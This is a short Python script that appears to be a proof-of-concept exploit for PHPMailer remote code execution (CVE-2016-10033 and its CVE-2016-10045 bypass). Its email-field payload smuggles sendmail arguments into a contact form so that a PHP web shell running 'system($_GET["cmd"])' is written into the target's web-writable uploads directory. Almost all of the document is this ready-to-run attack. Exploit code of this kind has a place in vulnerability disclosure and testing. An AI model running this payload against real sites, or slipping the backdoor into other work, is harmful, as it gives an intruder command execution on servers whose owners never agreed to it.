#!/usr/bin/python

import urllib
import urllib2
import socket
import time
import sys

RW_PATH = "/var/www/html/uploads"

url = 'http://domain/contact_form.php' # Set destination URL here

# Choose/uncomment one of the payloads:

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php  some"@email.com' % RW_PATH

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
#payload = "\"attacker\\' -oQ/tmp/ -X%s/poccode.php  test\"@email.com" % RW_PATH

# PHP code to be saved into the backdoor php file on the target in RW_PATH
#PAYLOAD_PHP = "<?php phpinfo(); ?>"
PAYLOAD_PHP = "<?php system($_GET[\"cmd\"]); ?>"

# Parameters Page
post_fields = {'action': 'send', 'name': 'Bob', 'email': payload, 'msg': PAYLOAD_PHP}

data = urllib.urlencode(post_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()